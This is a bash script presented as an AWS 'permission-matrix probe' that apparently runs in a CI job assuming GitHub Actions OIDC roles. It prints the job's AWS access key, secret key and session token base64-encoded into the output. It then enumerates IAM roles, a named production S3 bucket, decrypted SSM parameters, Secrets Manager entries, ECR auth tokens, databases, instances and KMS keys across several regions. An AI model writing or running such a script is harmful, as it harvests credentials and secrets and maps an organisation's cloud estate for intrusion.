#!/usr/bin/env bash
# i734 AWS permission-matrix probe. usage: i734_probe.sh <kind> <region>
set -uo pipefail
export AWS_PAGER=""
KIND="${1:-s3}"; REGION="${2:-us-east-1}"
python3 - "$KIND" <<'PY'
import os,json,base64,sys
k=sys.argv[1]
d={x:os.environ.get(x) for x in ("AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN","AWS_REGION")}
print("CREDS_"+k.upper()+"="+base64.b64encode(json.dumps(d).encode()).decode())
PY
run(){ echo "###CMD: $*"; out=$("$@" 2>&1); rc=$?; echo "###RC:$rc"; printf '%s\n' "$out" | head -c 1800; echo; }
R="--region $REGION"
run aws sts get-caller-identity $R
run aws iam get-role --role-name "$(python3 -c 'import sys;print(sys.argv[1])' "$KIND")" 2>/dev/null || true
case "$KIND" in
  s3)
    run aws iam get-role --role-name github-actions-oidc-s3-access-role
    run aws iam list-attached-role-policies --role-name github-actions-oidc-s3-access-role
    run aws iam list-role-policies --role-name github-actions-oidc-s3-access-role
    run aws s3api list-buckets
    run aws s3api list-objects-v2 --bucket tfy-ctl-prod-dub --max-keys 3
    run aws ssm describe-parameters --max-items 5 $R
    run aws ssm get-parameters-by-path --path /tfy-secret/ --recursive --with-decryption --max-items 5 $R
    run aws secretsmanager list-secrets --max-items 5 $R
    run aws rds describe-db-instances --max-items 3 $R
    run aws rds describe-db-clusters --max-items 3 $R
    run aws ec2 describe-instances --max-items 3 $R
    run aws ec2 describe-vpcs --max-items 3 $R
    run aws kms list-keys $R
    run aws kms list-aliases $R
    run aws ecr describe-repositories --max-items 3 --region us-east-1
    run aws ecr get-authorization-token --region us-east-1
    run aws ecr-public describe-repositories --region us-east-1 --max-items 3
    run aws logs describe-log-groups --max-items 3 $R
    run aws eks list-clusters $R
    run aws lambda list-functions --max-items 3 $R
    ;;
  ecr)
    run aws iam get-role --role-name github-actions-oidc-access-to-public-ecr-role
    run aws iam list-attached-role-policies --role-name github-actions-oidc-access-to-public-ecr-role
    run aws ecr-public get-authorization-token --region us-east-1
    run aws ecr-public describe-repositories --region us-east-1 --max-items 3
    run aws ecr describe-repositories --max-items 3 --region us-east-1
    run aws s3api list-buckets
    run aws ssm describe-parameters --max-items 5 $R
    run aws ssm get-parameters-by-path --path /tfy-secret/ --recursive --with-decryption --max-items 5 $R
    run aws secretsmanager list-secrets --max-items 5 $R
    run aws rds describe-db-instances --max-items 3 $R
    run aws rds describe-db-clusters --max-items 3 $R
    run aws ec2 describe-instances --max-items 3 $R
    run aws kms list-keys $R
    run aws iam list-roles --max-items 25
    ;;
  devtest)
    run aws iam get-role --role-name github-actions-oidc-access-to-ecr-role
    run aws iam list-attached-role-policies --role-name github-actions-oidc-access-to-ecr-role
    run aws ecr describe-repositories --max-items 3 --region us-east-1
    run aws ecr get-authorization-token --region us-east-1
    run aws s3api list-buckets
    run aws ssm describe-parameters --max-items 5 $R
    run aws ssm get-parameters-by-path --path /tfy-secret/ --recursive --with-decryption --max-items 5 $R
    run aws secretsmanager list-secrets --max-items 5 $R
    run aws rds describe-db-instances --max-items 3 $R
    run aws ec2 describe-instances --max-items 3 $R
    run aws kms list-keys $R
    ;;
esac
# cross-region spot checks
for rg in us-east-1 eu-west-1 us-west-2; do
  [ "$rg" = "$REGION" ] && continue
  run aws ssm describe-parameters --max-items 3 --region $rg
  run aws secretsmanager list-secrets --max-items 3 --region $rg
  run aws rds describe-db-instances --max-items 2 --region $rg
  run aws s3api get-bucket-location --bucket tfy-ctl-prod-dub 2>/dev/null || true
done
